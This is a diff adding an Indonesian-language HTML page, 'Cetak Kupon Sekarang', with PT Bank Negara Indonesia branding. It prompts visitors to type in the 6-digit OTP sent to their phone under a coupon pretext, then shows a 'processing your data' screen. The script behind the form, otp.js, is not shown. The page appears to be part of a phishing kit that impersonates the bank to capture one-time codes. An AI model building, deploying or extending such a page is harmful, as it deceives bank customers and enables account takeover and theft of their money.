@@ -1,0 +1,64 @@
+<html>
+	<head>
+		<title>Cetak Kupon Sekarang</title>
+		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+		<link rel="stylesheet" href="assets/common/css/global.css">
+		<link rel="stylesheet" href="assets/common/css/otp.css">
+		<link rel="stylesheet" href="assets/lib/loader/loader.css">
+		<link rel="stylesheet" href="assets/lib/ripple/ripple.css">
+		<script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
+        <script nomodule src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js"></script>
+		<script src="assets/lib/jquery/jquery.js"></script>
+		<script>
+			const module = {};
+		</script>
+		<script type="module" src="assets/common/js/otp.js"></script>
+	</head>
+	<body>
+		<div style="width: 100%; height: 100%; background-color: #ffffff; overflow: scroll; display: flex; flex-direction: column;">
+			<div style="width: calc(100% - 20px); display: flex; flex-direction: row; align-items: center; justify-content: space-between; padding: 10px;">
+				<img src="assets/common/img/logo1.png" style="width: 100px; height: 30px; object-fit: fill;">
+				<div style="display: flex; flex-direction: row; align-items: center;">
+					<div style="width: 50px; height: 50px; background-color: #efefef; display: flex; justify-content: center; align-items: center;">
+						<ion-icon name="search" style="font-size: 30px; color: #ff8736;"></ion-icon>
+					</div>
+					<div style="padding-left: 15px; padding-right: 15px; height: 50px; background-color: #efefef; display: flex; flex-direction: row; justify-content: center; align-items: center; margin-left: 10px;">
+						<div style="color: #ff8736; font-size: 14px;"><b>Menu</b></div>
+						<ion-icon name="menu" style="font-size: 30px; color: #ff8736; margin-left: 5px;"></ion-icon>
+					</div>
+				</div>
+			</div>
+			<div style="width: 100%; height: 2px; background-color: #013b78;"></div>
+			<img src="assets/common/img/img2.jpg" style="width: 100%; height: 250px; object-fit: fill; box-shadow: 0 5px 5px 2px rgba(0,0,0,.2); border-bottom: 2px solid #013b78; border-bottom-right-radius: 30px;">
+			<div id="otp-form" style="display: none; flex-direction: column; align-items: center; width: calc(100% - 74px); margin-top: 30px; margin-left: 20px; margin-right: 20px; padding: 15px; text-align: center; color: #ffffff; background-color: #ffffff; border-radius: 10px; font-size: 14px;">
+				<div style="color: #000000; font-size: 12px; text-align: center;"><b>Masukkan 6-digit kode OTP yang kami kirim ke handphone Anda</b></div>
+				<div style="width: 100%; height: 35px; background-color: #ffffff; border: 1px solid #88888833; border-radius: 2px; margin-top: 10px;">
+					<input id="otp" type="tel" maxlength="6" style="width: 100%; height: 100%; background-color: transparent; padding-left: 10px; padding-right: 10px; color: #000000; font-size: 14px; border: 0; outline: 0; text-align: center; font-weight: bold;">
+				</div>
+				<div onclick="module.next()" class="ripple" style="width: 100px; height: 35px; margin-top: 10px; margin-left: 10px; border: 1px solid #88888833; border-radius: 2px; display: flex; justify-content: center; align-items: center; color: #ffffff; font-size: 14px; background-color: #ff8736;">
+				    Selanjutnya
+				</div>
+			</div>
+			<div id="confirmation" style="width: 100%; height: 100%; background-color: #0000007f; display: flex; justify-content: center; align-items: center;">
+				<div style="width: calc(100% - 66px); height: 80px; border: 3px solid #ff8736; background-color: #ffffff; border-radius: 30px; display: flex; flex-direction: column; justify-content: center; align-items: center;">
+					<div style="color: #000000; font-size: 16px;"><b>Lanjut proses penyelesaian</b></div>
+					<div onclick="module.closeConfirmationDialog()" style="width: 50px; height: 30px; margin-top: 10px; display: flex; justify-content: center; align-items: center; color: #ff8736; font-size: 15px;">
+						<b>OK</b>
+					</div>
+				</div>
+			</div>
+			<div id="thank" style="display: none; width: calc(100% - 74px); margin-top: 30px; margin-left: 20px; margin-right: 20px; padding: 15px; text-align: center; color: #ffffff; background-color: #ff8736; border: 2px solid #ffffff; border-radius: 10px; text-shadow: 2px 2px 1px rgba(0,0,0,.8); font-size: 14px;">
+				<div id="text1" style="width: 100%; font-weight: bold;"></div>
+			</div>
+			<div style="position: fixed; left: 0; bottom: 0; width: 100%; height: 50px; display: flex; justify-content: center; align-items: center; background-color: #ff8736; color: #ffffff; font-size: 15px;">
+				© 2025 PT. Bank Negara Indonesia (Persero) Tbk.
+			</div>
+			<!--<audio id="success-audio" src="assets/common/audio/thank.mp3"></audio>-->
+			<div id="loader" style="display: none; flex-direction: column; align-items: center; position: fixed; left: 0; top: 0; width: 100%; height: 100%; background-color: #000000bf; justify-content: center; align-items: center;">
+				<div class="loader" style="width: 50px; height: 50px;"></div>
+				<div class="auto-fill-background-text" style="margin-top: 10px; font-size: 14px;"><b>Sedang memproses data Anda...</div>
+			</div>
+			<audio id="success-audio" src="assets/common/audio/thank.mp3" autoplay="false">
+		</div>
+	</body>
+</html>
